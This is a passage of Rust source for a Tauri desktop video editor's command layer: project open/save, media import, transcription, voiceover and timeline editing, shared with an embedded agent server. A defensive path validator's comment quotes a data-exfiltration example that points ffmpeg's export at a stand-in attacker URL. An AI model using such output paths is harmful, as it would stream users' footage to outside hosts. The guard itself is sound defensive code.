//! Tauri v2 shell for Kerf.
//!
//! Owns a single [`Project`] behind a mutex and exposes Tauri commands that
//! bridge the SvelteKit frontend to `kerf-core`. Read commands return domain
//! types; editing commands perform the mutation and return the refreshed
//! [`Timeline`] so the frontend can re-render in a single round-trip.
//!
//! **No command runs on the main thread.** A plain `#[tauri::command]` executes
//! on the main thread in Tauri v2 and would freeze the window for its duration,
//! so every quick command here is `#[tauri::command(async)]` (runs on the async
//! runtime) and every heavy one (ffmpeg decode / analysis / export, disk-bound
//! project open/save) is an `async fn` that pushes its work onto the blocking
//! thread pool via [`blocking`], resolving inputs under the shared project lock
//! and releasing it before the slow part.

mod gpu_preview;
mod mcp;
mod settings;

use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Arc, Mutex};

use base64::Engine as _;
use kerf_core::{
    Asset, AssetAnalysis, AudioEffect, CaptionFile, CaptionFormat, CaptionImportRequest, CaptionOptions, CaptionTimeBase,
    ClipCut, ClipMove, Delivery, EditSource, ExportOptions, Filmstrip, FilmstripSheet, Fit, ImportSummary, Keyframe, Levels,
    Mask, Project, Projection, ReframeKeyframe, Revision, SplitSide, StagedEdit, StreamKind, Task, TextKeyframe, TimeRange,
    Timeline, TimelineDiff, Transition, TransitionKind, VideoEffect, WaveformRange,
};
use serde::Serialize;
use tauri::{AppHandle, Emitter, Manager, State};
use uuid::Uuid;

struct AppState {
    project: Arc<Mutex<Project>>,
    /// Set by `cancel_export` and polled by the in-flight export; lives outside
    /// the project lock so a cancel lands even while a render holds it.
    export_cancel: Arc<AtomicBool>,
    /// Same, for the in-flight analysis pass. Analysis downloads a speech model
    /// and then transcribes for minutes, so it has to be abandonable — and the
    /// GUI runs imported assets through it one after another, which is a long
    /// commitment to make on the user's behalf without an exit.
    analysis_cancel: Arc<AtomicBool>,
    /// Same, for the Mixer's loudness measurement. It holds the heavy-job lease for
    /// a whole-mix decode (minutes on a long cut), so it has to be stoppable.
    levels_cancel: Arc<AtomicBool>,
    /// Same, for a voiceover being synthesized (or its model downloading).
    voiceover_cancel: Arc<AtomicBool>,
    /// Whether the main window has been shown. It is created hidden (`visible:
    /// false` in `tauri.conf.json`) so nobody sees the webview's unthemed first
    /// frame; the webview asks for it once the theme is applied
    /// (`show_main_window`), a timer shows it anyway if that never happens, and
    /// whichever comes first wins (`reveal_once`).
    main_window_shown: Arc<AtomicBool>,
    /// What this launch (or a second one that arrived while the webview was still
    /// booting) asked to open, held until the webview takes it
    /// (`take_launch_project`). A pull rather than an event: an event emitted
    /// before the page has a listener is lost.
    launch: Mutex<LaunchSlot>,
}

#[derive(Serialize)]
struct AssetMetadata {
    asset: Asset,
    analysis: Option<AssetAnalysis>,
}

type CmdResult<T> = Result<T, String>;

impl AppState {
    fn project(&self) -> std::sync::MutexGuard<'_, Project> {
        lock_user(&self.project)
    }
}

/// Lock the shared project for a GUI command, attributing edits to the user;
/// the MCP server attributes its own edits to the agent under the same lock
/// (see `mcp::KerfMcp::lock`). Recovers from a poisoned mutex (a panic while
/// another op held it) rather than failing every command for the rest of the
/// session.
fn lock_user(project: &Mutex<Project>) -> std::sync::MutexGuard<'_, Project> {
    let mut guard = project.lock().unwrap_or_else(|e| e.into_inner());
    guard.set_actor(EditSource::User);
    guard
}

/// Run a blocking (ffmpeg / disk) job on the blocking thread pool and await it.
/// Commands doing heavy work must go through this: a plain command body runs on
/// the main thread (freezing the window) and an `async` one on the shared tokio
/// workers (starving the MCP server), while the blocking pool grows on demand.
async fn blocking<T: Send + 'static>(job: impl FnOnce() -> CmdResult<T> + Send + 'static) -> CmdResult<T> {
    tauri::async_runtime::spawn_blocking(job).await.map_err(|e| e.to_string())?
}

fn id(s: &str) -> CmdResult<Uuid> {
    Uuid::parse_str(s).map_err(|e| e.to_string())
}

fn kind(s: &str) -> CmdResult<StreamKind> {
    match s.to_lowercase().as_str() {
        "video" => Ok(StreamKind::Video),
        "audio" => Ok(StreamKind::Audio),
        other => Err(format!("invalid track kind '{other}'; expected \"video\" or \"audio\"")),
    }
}

/// Build a `Transition` from a kind string + duration, or `None` to clear it.
fn parse_transition(kind: Option<String>, duration: Option<f64>) -> CmdResult<Option<Transition>> {
    match kind {
        None => Ok(None),
        Some(k) => {
            let kind = TransitionKind::parse(&k).ok_or_else(|| {
                format!(
                    "invalid transition kind '{k}'; expected one of {}",
                    TransitionKind::wire_names()
                )
            })?;
            let duration = duration.ok_or("transition duration is required")?;
            Ok(Some(Transition { kind, duration }))
        }
    }
}

/// Reject a caller-supplied output path that names an ffmpeg protocol sink
/// (`rtmp://…`, `http://…`, `pipe:1`, `concat:a|b`, …) instead of a plain
/// local file, and require it be absolute. ffmpeg resolves the protocol (and
/// a relative path resolves) from the string alone with no local file ever
/// written to look suspicious — this is what stops
/// `export(output_path="https://attacker.example/upload")` from making Kerf's
/// own ffmpeg stream the timeline off the machine.
///
/// A single ASCII letter immediately before a `:` that is followed by `\` or
/// `/` is a Windows drive letter (`C:\Users\...`), not a protocol scheme —
/// ffmpeg itself special-cases this the same way, so it is let through.
pub(crate) fn require_local_output_path(path: &str) -> Result<(), String> {
    if let Some(colon) = path.find(':') {
        let scheme = &path[..colon];
        let after = &path[colon + 1..];
        let is_drive_letter =
            scheme.len() == 1 && scheme.chars().all(|c| c.is_ascii_alphabetic()) && after.starts_with(['\\', '/']);
        let looks_like_scheme = !scheme.is_empty()
            && scheme.chars().next().is_some_and(|c| c.is_ascii_alphabetic())
            && scheme
                .chars()
                .all(|c| c.is_ascii_alphanumeric() || matches!(c, '+' | '-' | '.'));
        if looks_like_scheme && !is_drive_letter {
            return Err(format!(
                "output path {path:?} looks like a URL or ffmpeg protocol sink, not a local file path"
            ));
        }
    }
    let bytes = path.as_bytes();
    let is_windows_absolute =
        bytes.len() >= 3 && bytes[0].is_ascii_alphabetic() && bytes[1] == b':' && matches!(bytes[2], b'\\' | b'/');
    if !(path.starts_with('/') || path.starts_with("\\\\") || is_windows_absolute) {
        return Err(format!("output path {path:?} must be an absolute local file path"));
    }
    Ok(())
}

// ---- read ------------------------------------------------------------------

#[tauri::command(async)]
fn list_assets(state: State<'_, AppState>) -> CmdResult<Vec<Asset>> {
    state.project().list_assets().map_err(|e| e.to_string())
}

/// Distinct family names of every font installed on this machine, for the
/// text overlay font picker.
#[tauri::command(async)]
fn list_fonts() -> CmdResult<Vec<String>> {
    Ok(kerf_core::list_system_fonts())
}

#[tauri::command(async)]
fn get_timeline(state: State<'_, AppState>) -> CmdResult<Timeline> {
    state.project().timeline().map_err(|e| e.to_string())
}

#[tauri::command(async)]
fn get_asset_metadata(state: State<'_, AppState>, asset_id: String) -> CmdResult<AssetMetadata> {
    let id = id(&asset_id)?;
    let project = state.project();
    let asset = project.require_asset(id).map_err(|e| e.to_string())?;
    let analysis = project.get_analysis(id).map_err(|e| e.to_string())?;
    Ok(AssetMetadata { asset, analysis })
}

// ---- project file (open / save) --------------------------------------------

/// Path of the `.kerf` file backing the open project, or `null` if it lives
/// only in memory (the seeded sample) and isn't persisted yet.
#[tauri::command(async)]
fn project_path(state: State<'_, AppState>) -> CmdResult<Option<String>> {
    Ok(state.project().path().map(|p| p.display().to_string()))
}

/// Replace the open project with a fresh, empty in-memory one (no sample data).
/// Like the seeded sample it isn't persisted until `save_project_as`. The GUI and
/// the embedded MCP server share this `Project`, so both switch to it.
#[tauri::command(async)]
fn new_project(state: State<'_, AppState>) -> CmdResult<Option<String>> {
    let mut project = state.project();
    *project = Project::open_in_memory().map_err(|e| e.to_string())?;
    Ok(project.path().map(|p| p.display().to_string()))
}

/// Open an existing `.kerf` file, replacing the in-memory project. Both the GUI
/// and the embedded MCP server share this `Project`, so both now operate on —
/// and persist to — the opened file. Returns its path.
#[tauri::command]
async fn open_project(app: AppHandle, state: State<'_, AppState>, path: String) -> CmdResult<Option<String>> {
    let shared = state.project.clone();
    blocking(move || {
        // Open the file first, then swap it in — the (disk-bound) open doesn't
        // hold the shared lock, and a failed open leaves the current project intact.
        let opened = Project::open(&path).map_err(|e| e.to_string())?;
        let mut project = lock_user(&shared);
        *project = opened;
        let result = project.path().map(|p| p.display().to_string());
        let assets = project.list_assets().unwrap_or_default();
        drop(project);
        // The speech model is remembered per project, so transcribing in the
        // reopened one uses the model it was cut with.
        restore_speech_model(&shared);
        // Make sure every video asset in the reopened project has a preview proxy
        // (a cached one is a cheap no-op; a missing one regenerates in the background).
        for asset in &assets {
            spawn_proxy(&app, asset);
        }
        Ok(result)
    })
    .await
}

/// Everything an edit can change while `save_project_as` has the lock released:
/// the cut, the media, the task queue and a staged proposal. Content rather than
/// the revision seq, which an undo followed by a new edit recycles.
fn project_fingerprint(project: &Project) -> CmdResult<String> {
    let err = |e: kerf_core::Error| e.to_string();
    serde_json::to_string(&(
        project.timeline().map_err(err)?,
        project.list_assets().map_err(err)?,
        project.list_tasks().map_err(err)?,
        project.staged().map_err(err)?,
    ))
    .map_err(|e| e.to_string())
}

/// Snapshot the current project to a new `.kerf` file and switch to it, so
/// subsequent edits (from the GUI and the agent alike) write through to disk.
/// Returns the saved path.
///
/// The reopen runs with the lock released, like `open_project`, so a slow
/// filesystem doesn't freeze the GUI and every MCP call. An edit landing in that
/// window would be on the old project, so the reopened one is only swapped in
/// if nothing changed; otherwise the save is redone under one held lock.
#[tauri::command]
async fn save_project_as(state: State<'_, AppState>, path: String) -> CmdResult<Option<String>> {
    let shared = state.project.clone();
    blocking(move || {
        let before = {
            let project = lock_user(&shared);
            project.save_as(&path).map_err(|e| e.to_string())?;
            project_fingerprint(&project)?
        };
        let opened = Project::open(&path).map_err(|e| e.to_string())?;
        let mut project = lock_user(&shared);
        if project_fingerprint(&project)? == before {
            *project = opened;
        } else {
            // Close the stale copy first: `save_as` deletes the file it replaces,
            // which Windows refuses while it is open.
            drop(opened);
            project.save_as(&path).map_err(|e| e.to_string())?;
            *project = Project::open(&path).map_err(|e| e.to_string())?;
        }
        Ok(project.path().map(|p| p.display().to_string()))
    })
    .await
}

// ---- import / analysis -----------------------------------------------------

/// Progress of a slow import (an Insta360 lens pair being stitched), tagged with
/// the file the user picked so the UI can label it while several import at once.
#[derive(Clone, serde::Serialize)]
pub(crate) struct ImportProgress {
    path: String,
    fraction: f64,
    elapsed_secs: f64,
    eta_secs: Option<f64>,
}

impl ImportProgress {
    /// Tag a render-progress tick with the file it belongs to. Shared with the
    /// MCP `import_asset` tool so an agent's import reports on the same event
    /// and drives the same overlay the user's own import does.
    pub(crate) fn new(path: &str, p: kerf_core::ExportProgress) -> Self {
        Self {
            path: path.to_string(),
            fraction: p.fraction,
            elapsed_secs: p.elapsed_secs,
            eta_secs: p.eta_secs,
        }
    }
}

#[tauri::command]
async fn import_asset(app: AppHandle, state: State<'_, AppState>, path: String) -> CmdResult<Asset> {
    let shared = state.project.clone();
    blocking(move || {
        // Probe (and, for an Insta360 lens pair, stitch) without the lock — so
        // parallel imports really run in parallel and a multi-minute stitch never
        // freezes the GUI or the agent — then take it only for the quick insert.
        let mut on_progress = |p: kerf_core::ExportProgress| {
            let _ = app.emit("import-progress", ImportProgress::new(&path, p));
        };
        let asset = Project::probe_import(std::path::Path::new(&path), &mut on_progress).map_err(|e| e.to_string())?;
        // Importing the pair's other lens (or the same file twice) resolves to
        // the asset already in the project instead of duplicating it.
        let asset = lock_user(&shared).insert_or_get_asset(&asset).map_err(|e| e.to_string())?;
        // Kick off the preview proxy in the background; preview uses the original
        // until it lands (see `spawn_proxy`).
        spawn_proxy(&app, &asset);
        Ok(asset)
    })
    .await
}

/// Queue an asset's preview proxy (all-intra, downscaled) for background
/// generation so scrubbing decodes one keyframe instead of seeking a long GOP. Non-blocking and
/// best-effort: previews fall back to the original source until the proxy lands,
/// at which point we emit `proxy-ready` so the webview re-fetches the current
/// frame. Stills and audio-only assets are skipped (they get no proxy).
pub(crate) fn spawn_proxy(app: &AppHandle, asset: &Asset) {
    let has_video = asset.streams.iter().any(|s| s.kind == StreamKind::Video);
    if !has_video || asset.is_image() {
        return;
    }
    // 360 assets proxy larger — reframing crops most of the frame away.
    let width = kerf_core::proxy_width(asset.projection());
    if let Err(e) = proxy_jobs().send((app.clone(), asset.path.clone(), width)) {
        tracing::warn!(error = %e, "preview proxy queue is closed");
    }
}

/// How many proxy encodes may run at once. Importing many large sources (or
/// reopening a project full of them) would otherwise spawn one full-file
/// re-encode per file *at once*. The engine's CPU budget now gates every heavy
/// job anyway (`kerf_core::engine::cpu`), so raising `KERF_PROXY_WORKERS` above
/// the default of 1 buys queued encodes rather than concurrent ones — the knob
/// that decides how much of the machine they get is the CPU limit in Settings.
fn proxy_workers() -> usize {
    std::env::var("KERF_PROXY_WORKERS")
        .ok()
        .and_then(|v| v.parse::<usize>().ok())
        .map(|n| n.max(1))
        .unwrap_or(1)
}

/// The bounded background worker pool that generates preview proxies. Every proxy
/// job is funnelled through `proxy_workers()` workers (each encode also
/// thread-capped in the engine), leaving the machine responsive while proxies
/// trickle in; previews use the original source until each one lands.
fn proxy_jobs() -> &'static std::sync::mpsc::Sender<(AppHandle, String, u32)> {
    static QUEUE: std::sync::OnceLock<std::sync::mpsc::Sender<(AppHandle, String, u32)>> = std::sync::OnceLock::new();
    QUEUE.get_or_init(|| {
        let (tx, rx) = std::sync::mpsc::channel::<(AppHandle, String, u32)>();
        let rx = Arc::new(Mutex::new(rx));
        for _ in 0..proxy_workers() {
            let rx = Arc::clone(&rx);
            std::thread::spawn(move || loop {
                // Hold the lock only to dequeue, then release it before the encode
                // so the other workers can pull the next job concurrently.
                let job = match rx.lock() {
                    Ok(guard) => guard.recv(),
                    Err(_) => break,
                };
                let Ok((app, path, width)) = job else { break };
                match kerf_core::generate_proxy(std::path::Path::new(&path), width) {
                    Ok(_) => {
                        if let Err(e) = app.emit("proxy-ready", ()) {
                            tracing::warn!(error = %e, "failed to emit proxy-ready");
                        }
                    }
                    Err(e) => tracing::warn!(error = %e, path = %path, "preview proxy generation failed"),
                }
            });
        }
        tx
    })
}

/// One step of an analysis pass, tagged with the asset it belongs to so the bin
/// can badge the right row when several assets are analyzed at once.
#[derive(Serialize, Clone)]
struct AnalysisProgressEvent {
    asset_id: String,
    stage: String,
    fraction: Option<f64>,
    detail: Option<String>,
}

#[tauri::command]
async fn analyze_asset(app: AppHandle, state: State<'_, AppState>, asset_id: String) -> CmdResult<AssetAnalysis> {
    let id = id(&asset_id)?;
    let shared = state.project.clone();
    // Fresh cancel flag for this pass; `cancel_analysis` flips it from the UI.
    let cancel = state.analysis_cancel.clone();
    cancel.store(false, Ordering::SeqCst);
    blocking(move || {
        // Resolve the asset under the lock, run the multi-second ffmpeg analysis
        // with the lock released, then re-acquire it only to cache the result —
        // so the GUI and the MCP agent stay responsive while analysis runs.
        let asset = lock_user(&shared).require_asset(id).map_err(|e| e.to_string())?;
        // Analysis is no longer a short opaque wait: the first transcription
        // downloads a speech model and then runs inference for minutes, so each
        // step is streamed to the webview rather than hidden behind a spinner.
        let mut on_progress = |p: kerf_core::AnalysisProgress| {
            let _ = app.emit(
                "analysis-progress",
                AnalysisProgressEvent {
                    asset_id: asset_id.clone(),
                    stage: p.stage,
                    fraction: p.fraction,
                    detail: p.detail,
                },
            );
        };
        let analysis = kerf_core::analyze_asset_media_cancellable(&asset, &mut on_progress, &|| cancel.load(Ordering::SeqCst))
            .map_err(|e| match e {
                // A cancel is the user's own doing, not a failure — the
                // caller keys off this string to stay quiet about it.
                kerf_core::Error::Cancelled => ANALYSIS_CANCELLED.to_string(),
                other => other.to_string(),
            })?;
        // Nothing is cached for a cancelled pass: a half-analyzed asset would
        // read as analyzed, and the missing transcript as "no speech".
        lock_user(&shared).set_analysis(&analysis).map_err(|e| e.to_string())?;
        Ok(analysis)
    })
    .await
}

// ---- speech-to-text -------------------------------------------------------

/// The project-meta key holding the user's speech-model choice.
pub(crate) const SPEECH_MODEL_KEY: &str = "speech_model";

/// Which transcription backend this build will use, and whether its model is
/// already downloaded. The transcript tab reads this to explain an empty
/// transcript instead of just showing nothing.
#[tauri::command(async)]
fn transcription_status() -> CmdResult<kerf_core::TranscriptionStatus> {
    Ok(kerf_core::transcription_status())
}

/// Pick which speech model transcription uses, remembering it in the project.
///
/// `None` clears the choice back to the environment / built-in default. The
/// model is not downloaded here — that happens on the next transcription, or
/// via `download_speech_model`.
#[tauri::command(async)]
fn set_speech_model(state: State<'_, AppState>, name: Option<String>) -> CmdResult<kerf_core::TranscriptionStatus> {
    kerf_core::set_speech_model(name.as_deref());
    state
        .project()
        .set_meta(SPEECH_MODEL_KEY, name.as_deref().unwrap_or(""))
        .map_err(|e| e.to_string())?;
    Ok(kerf_core::transcription_status())
}

/// Apply the speech-model choice stored in `project` (a no-op when unset), so a
/// reopened project transcribes with the model the user picked for it.
fn restore_speech_model(project: &Mutex<Project>) {
    let stored = lock_user(project).meta(SPEECH_MODEL_KEY).ok().flatten();
    kerf_core::set_speech_model(stored.as_deref().filter(|s| !s.is_empty()));
}

/// A speech model download in flight.
#[derive(Serialize, Clone)]
struct ModelProgressEvent {
    model: String,
    downloaded_bytes: u64,
    total_bytes: Option<u64>,
    fraction: Option<f64>,
}

/// Download a speech model ahead of time, streaming `model-progress`.
///
/// Transcription downloads on demand anyway; this exists so the user can start
/// the (few hundred megabyte) fetch deliberately, and pick a model other than
/// the default, instead of discovering it mid-analysis.
#[tauri::command]
async fn download_speech_model(app: AppHandle, name: String) -> CmdResult<String> {
    blocking(move || {
        let mut on_progress = |p: kerf_core::DownloadProgress| {
            let _ = app.emit(
                "model-progress",
                ModelProgressEvent {
                    model: name.clone(),
                    downloaded_bytes: p.downloaded,
                    total_bytes: p.total,
                    fraction: p.fraction(),
                },
            );
        };
        let path = kerf_core::download_speech_model(&name, &mut on_progress).map_err(|e| e.to_string())?;
        Ok(path.to_string_lossy().into_owned())
    })
    .await
}

// ---- voiceover ---------------------------------------------------------------

/// Whether voiceovers can be generated here, what the first one has to
/// download, and the voices on offer.
#[tauri::command(async)]
fn voiceover_status() -> CmdResult<kerf_core::VoiceoverStatus> {
    Ok(kerf_core::voiceover_status())
}

/// One step of generating a voiceover: a download (`download_runtime`,
/// `download_model`, `download_voice`) or `synthesize`.
#[derive(Serialize, Clone)]
pub(crate) struct VoiceoverProgressEvent {
    pub(crate) stage: String,
    pub(crate) fraction: Option<f64>,
    pub(crate) detail: Option<String>,
}

/// The error an abandoned voiceover returns, for the webview to stay quiet on.
const VOICEOVER_CANCELLED: &str = "voiceover cancelled";

fn voiceover_err(e: kerf_core::Error) -> String {
    match e {
        kerf_core::Error::Cancelled => VOICEOVER_CANCELLED.to_string(),
        other => other.to_string(),
    }
}

/// Download the voice runtime, model and `voice` ahead of time, streaming
/// `voiceover-progress`, so the first voiceover starts synthesizing at once.
#[tauri::command]
async fn prepare_voiceover(app: AppHandle, state: State<'_, AppState>, voice: String) -> CmdResult<kerf_core::VoiceoverStatus> {
    let cancel = state.voiceover_cancel.clone();
    cancel.store(false, Ordering::SeqCst);
    blocking(move || {
        let mut on_progress = |stage: &str, fraction: Option<f64>, detail: Option<String>| {
            let _ = app.emit(
                "voiceover-progress",
                VoiceoverProgressEvent {
                    stage: stage.to_string(),
                    fraction,
                    detail,
                },
            );
        };
        kerf_core::prepare_voiceover(&voice, &mut on_progress, &|| cancel.load(Ordering::SeqCst)).map_err(voiceover_err)?;
        Ok(kerf_core::voiceover_status())
    })
    .await
}

#[derive(Serialize)]
struct VoiceoverResult {
    asset: Asset,
    timeline: Timeline,
}

/// Read `text` aloud and put it on the timeline — on the `VO` track unless
/// `track_id` names another audio track, at `timeline_start` or after what is
/// already there — then caption the cut when `captions` is given.
///
/// Synthesis (and a first-use model download) runs with the project lock
/// released, like an import; only landing the result takes it.
#[tauri::command]
#[allow(clippy::too_many_arguments)]
async fn generate_voiceover(
    app: AppHandle,
    state: State<'_, AppState>,
    text: String,
    voice: Option<String>,
    speed: Option<f64>,
    track_id: Option<String>,
    timeline_start: Option<f64>,
    captions: Option<CaptionOptions>,
) -> CmdResult<VoiceoverResult> {
    let track = track_id.as_deref().map(id).transpose()?;
    let shared = state.project.clone();
    let cancel = state.voiceover_cancel.clone();
    cancel.store(false, Ordering::SeqCst);
    blocking(move || {
        let voice = voice.unwrap_or_else(|| kerf_core::DEFAULT_VOICE.to_string());
        let mut on_progress = |stage: &str, fraction: Option<f64>, detail: Option<String>| {
            let _ = app.emit(
                "voiceover-progress",
                VoiceoverProgressEvent {
                    stage: stage.to_string(),
                    fraction,
                    detail,
                },
            );
        };
        let asset = Project::synthesize_voiceover(&text, &voice, speed.unwrap_or(1.0), &mut on_progress, &|| {
            cancel.load(Ordering::SeqCst)
        })
        .map_err(voiceover_err)?;
        let project = lock_user(&shared);
        let (asset, _) = project
            .place_voiceover(&asset, track, timeline_start)
            .map_err(|e| e.to_string())?;
        if let Some(options) = captions {
            project.generate_captions(options).map_err(|e| e.to_string())?;
        }
        let timeline = project.timeline().map_err(|e| e.to_string())?;
        Ok(VoiceoverResult { asset, timeline })
    })
    .await
}

/// Request cancellation of the voiceover being generated (or its download).
#[tauri::command(async)]
fn cancel_voiceover(state: State<'_, AppState>) {
    state.voiceover_cancel.store(true, Ordering::SeqCst);
}

// ---- ripple mode -------------------------------------------------------------

/// Whether the project edits in ripple mode (off for a project that never said).
#[tauri::command(async)]
fn get_ripple_mode(state: State<'_, AppState>) -> CmdResult<bool> {
    state.project().ripple_mode().map_err(|e| e.to_string())
}

/// Turn ripple mode on or off for the project and answer with what is stored.
/// A setting, not an edit: no revision, and the timeline does not move, so
/// nothing is returned but the flag.
#[tauri::command(async)]
fn set_ripple_mode(state: State<'_, AppState>, on: bool) -> CmdResult<bool> {
    let project = state.project();
    project.set_ripple_mode(on).map_err(|e| e.to_string())?;
    project.ripple_mode().map_err(|e| e.to_string())
}

// ---- timeline editing (each returns the refreshed timeline) ----------------

#[tauri::command(async)]
fn cut_clip(state: State<'_, AppState>, asset_id: String, start: f64, end: f64) -> CmdResult<Timeline> {
    let id = id(&asset_id)?;
    let project = state.project();
    project.cut_clip(id, start, end).map_err(|e| e.to_string())?;
    project.timeline().map_err(|e| e.to_string())
}

#[tauri::command(async)]
fn add_clip(
    state: State<'_, AppState>,
    asset_id: String,
    track_id: Option<String>,
    source_in: f64,
    source_out: f64,
    timeline_start: Option<f64>,
) -> CmdResult<Timeline> {
    let asset = id(&asset_id)?;
    let track = track_id.as_deref().map(id).transpose()?;
    let project = state.project();
    project
        .add_clip_to_timeline(asset, track, source_in, source_out, timeline_start)
        .map_err(|e| e.to_string())?;
    project.timeline().map_err(|e| e.to_string())
}

/// Split a clip at timeline time `at`. A clip's linked partners (a picture and its
/// detached sound) are split at the same moment unless `link` is `false`.
#[tauri::command(async)]
fn split_clip(state: State<'_, AppState>, clip_id: String, at: f64, link: Option<bool>) -> CmdResult<Timeline> {
    let id = id(&clip_id)?;
    let project = state.project();
    project.with_links(link, |p| p.split_at(id, at)).map_err(|e| e.to_string())?;
    project.timeline().map_err(|e| e.to_string())
}

#[tauri::command(async)]
fn trim_clip(
    state: State<'_, AppState>,
    clip_id: String,
    source_in: Option<f64>,
    source_out: Option<f64>,
    timeline_start: Option<f64>,
    link: Option<bool>,
) -> CmdResult<Timeline> {
    let id = id(&clip_id)?;
    let project = state.project();
    project
        .with_links(link, |p| p.trim(id, source_in, source_out, timeline_start))
        .map_err(|e| e.to_string())?;
    project.timeline().map_err(|e| e.to_string())
}

#[tauri::command(async)]
fn reorder_clip(state: State<'_, AppState>, track_id: String, clip_id: String, new_index: usize) -> CmdResult<Timeline> {
    let track = id(&track_id)?;
    let clip = id(&clip_id)?;
    let project = state.project();
    project.reorder(track, clip, new_index).map_err(|e| e.to_string())?;
    project.timeline().map_err(|e| e.to_string())
}

#[tauri::command(async)]
fn move_clip(
    state: State<'_, AppState>,
    clip_id: String,
    timeline_start: f64,
    track_id: Option<String>,
    link: Option<bool>,
) -> CmdResult<Timeline> {
    let clip = id(&clip_id)?;
    let track = track_id.as_deref().map(id).transpose()?;
    let project = state.project();
    project
        .with_links(link, |p| p.move_clip(clip, timeline_start, track))
        .map_err(|e| e.to_string())?;
    project.timeline().map_err(|e| e.to_string())
}

/// Move several clips in **one** revision — a marquee selection dragged
/// together. Each move names a clip, its absolute start and optionally another
/// track of the same kind; the whole group is checked as a group and an illegal
/// one changes nothing. Never ripples. Linked partners of the named clips move
/// with them (by the same Δt, on their own tracks) unless `link` is `false`.
#[tauri::command(async)]
fn move_clips(state: State<'_, AppState>, moves: Vec<ClipMove>, link: Option<bool>) -> CmdResult<Timeline> {
    let project = state.project();
    project
        .with_links(link, |p| p.move_clips(&moves))
        .map_err(|e| e.to_string())?;
    project.timeline().map_err(|e| e.to_string())
}

#[tauri::command(async)]
fn ripple_delete(state: State<'_, AppState>, clip_id: String, link: Option<bool>) -> CmdResult<Timeline> {
    let id = id(&clip_id)?;
    let project = state.project();
    project.with_links(link, |p| p.ripple_delete(id)).map_err(|e| e.to_string())?;
    project.timeline().map_err(|e| e.to_string())
}

#[tauri::command(async)]
fn cut_clip_range(state: State<'_, AppState>, clip_id: String, from: f64, to: f64, link: Option<bool>) -> CmdResult<Timeline> {
    let id = id(&clip_id)?;
    let project = state.project();
    project
        .with_links(link, |p| p.cut_clip_range(id, from, to))
        .map_err(|e| e.to_string())?;
    project.timeline().map_err(|e| e.to_string())
}

/// Roll the cut between two adjacent clips of one track: `clip_a`'s end and
/// `clip_b`'s start move together by `delta` seconds (positive is later), clamped
/// to each clip's footage and a 0.05 s floor. Never ripples. The cuts of linked
/// partner pairs roll with it unless `link` is `false`.
#[tauri::command(async)]
fn roll_edit(state: State<'_, AppState>, clip_a: String, clip_b: String, delta: f64, link: Option<bool>) -> CmdResult<Timeline> {
    let (a, b) = (id(&clip_a)?, id(&clip_b)?);
    let project = state.project();
    project
        .with_links(link, |p| p.roll_edit(a, b, delta))
        .map_err(|e| e.to_string())?;
    project.timeline().map_err(|e| e.to_string())
}

/// Slip a clip: show a different part of its footage in the same place and for
/// the same length. `delta` is in **source** seconds, positive = starts later in
/// its own footage (mirrored window for a reversed clip). Clamped to the footage.
/// Never ripples. Linked partners slip by the same moment of footage unless `link`
/// is `false`.
#[tauri::command(async)]
fn slip_clip(state: State<'_, AppState>, clip_id: String, delta: f64, link: Option<bool>) -> CmdResult<Timeline> {
    let id = id(&clip_id)?;
    let project = state.project();
    project
        .with_links(link, |p| p.slip_clip(id, delta))
        .map_err(|e| e.to_string())?;
    project.timeline().map_err(|e| e.to_string())
}

/// Slide a clip along its track by `delta` timeline seconds, the neighbours that
/// touch it giving way. Clamped to their footage and a 0.05 s floor. Never ripples.
/// Linked partners slide with it unless `link` is `false`.
#[tauri::command(async)]
fn slide_clip(state: State<'_, AppState>, clip_id: String, delta: f64, link: Option<bool>) -> CmdResult<Timeline> {
    let id = id(&clip_id)?;
    let project = state.project();
    project
        .with_links(link, |p| p.slide_clip(id, delta))
        .map_err(|e| e.to_string())?;
    project.timeline().map_err(|e| e.to_string())
}

/// Split a clip at timeline time `at` and remove one half (`side` is `"left"` or
/// `"right"`): trim the start / end to the playhead. Follows ripple mode. Linked
/// partners that span `at` are trimmed with it unless `link` is `false`.
#[tauri::command(async)]
fn split_remove(state: State<'_, AppState>, clip_id: String, at: f64, side: String, link: Option<bool>) -> CmdResult<Timeline> {
    let id = id(&clip_id)?;
    let side = SplitSide::parse(&side).ok_or_else(|| format!("invalid side '{side}'; expected \"left\" or \"right\""))?;
    let project = state.project();
    project
        .with_links(link, |p| p.split_remove(id, at, side))
        .map_err(|e| e.to_string())?;
    project.timeline().map_err(|e| e.to_string())
}

/// Split and remove on several clips as **one** revision — the playhead trim of a
/// selection, V1 and its A1 partner together, undone in one step. Each cut names a
/// clip and its time; `side` is the same for all. All or nothing, one clip per track;
/// follows ripple mode, each track on its own. Linked partners of a named clip that
/// are not named are cut with it unless `link` is `false`.
#[tauri::command(async)]
fn split_remove_clips(state: State<'_, AppState>, cuts: Vec<ClipCut>, side: String, link: Option<bool>) -> CmdResult<Timeline> {
    let side = SplitSide::parse(&side).ok_or_else(|| format!("invalid side '{side}'; expected \"left\" or \"right\""))?;
    let project = state.project();
    project
        .with_links(link, |p| p.split_remove_clips(&cuts, side))
        .map_err(|e| e.to_string())?;
    project.timeline().map_err(|e| e.to_string())
}

#[tauri::command(async)]
fn add_track(state: State<'_, AppState>, kind: String, name: Option<String>) -> CmdResult<Timeline> {
    let kind = self::kind(&kind)?;
    let project = state.project();
    project.add_track(kind, name).map_err(|e| e.to_string())?;
    project.timeline().map_err(|e| e.to_string())
}

#[tauri::command(async)]
fn remove_track(state: State<'_, AppState>, track_id: String) -> CmdResult<Timeline> {
    let id = id(&track_id)?;
    let project = state.project();
    project.remove_track(id).map_err(|e| e.to_string())?;
    project.timeline().map_err(|e| e.to_string())
}

#[tauri::command(async)]
fn set_track_duck(state: State<'_, AppState>, track_id: String, duck: bool) -> CmdResult<Timeline> {
    let id = id(&track_id)?;
    let project = state.project();
    project.set_track_duck(id, duck).map_err(|e| e.to_string())?;
    project.timeline().map_err(|e| e.to_string())
}

/// Set a track's fader — the gain riding every clip on the track.
#[tauri::command(async)]
fn set_track_volume(state: State<'_, AppState>, track_id: String, volume: f32) -> CmdResult<Timeline> {
    let id = id(&track_id)?;
    let project = state.project();
    project.set_track_volume(id, volume).map_err(|e| e.to_string())?;
    project.timeline().map_err(|e| e.to_string())
}

/// Set a track's stereo placement, -1 (hard left) to 1 (hard right).
#[tauri::command(async)]
fn set_track_pan(state: State<'_, AppState>, track_id: String, pan: f32) -> CmdResult<Timeline> {
    let id = id(&track_id)?;
    let project = state.project();
    project.set_track_pan(id, pan).map_err(|e| e.to_string())?;
